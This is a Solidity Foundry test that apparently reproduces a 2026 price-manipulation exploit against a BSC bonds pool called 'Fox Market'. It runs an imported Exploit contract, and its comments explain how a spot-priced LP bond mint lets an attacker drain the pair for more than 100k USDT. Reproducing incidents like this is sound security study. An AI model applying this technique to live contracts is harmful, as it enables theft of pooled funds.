// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.28;

import "forge-std/Test.sol";
import {Exploit, FoxLpBondsPool, Treasury, PancakePair, MiniUSDT} from "./2026-08-FoxMarket.sol";

// Fox Market (BSC, 2026-08-15). FoxLpBondsPool.stake() sizes the mint from a
// same-pool spot quote (getAmountsOut(1 FOX)) BEFORE dumping half the USDT into
// that pair; the liquid 3% inviter FOX minted at the pre-trade price is sold back
// into the reserve-smashed curve. Verbatim getSwapPrice / stake / Treasury.lpBonds
// against a faithful Pancake V2 double seeded with the real pre-attack reserves.
contract FoxMarketTest is Test {
    function test_exploit_spotPricedLpBond_drainsPair() public {
        Exploit e = new Exploit();
        e.run();

        emit log_named_uint("war chest USDT in", e.warChest());
        emit log_named_uint("inviter FOX (minted at pre-trade price)", e.inviterFox());
        emit log_named_uint("USDT held after selling inviter FOX", e.usdtOut());
        emit log_named_uint("net profit (USDT)", e.profit());

        // The attacker nets far more USDT than the deposit — the pool's original
        // liquidity, extracted via the mispriced liquid inviter reward.
        assertGt(e.profit(), 100_000 ether, "attacker must net > 100k USDT");
    }
}
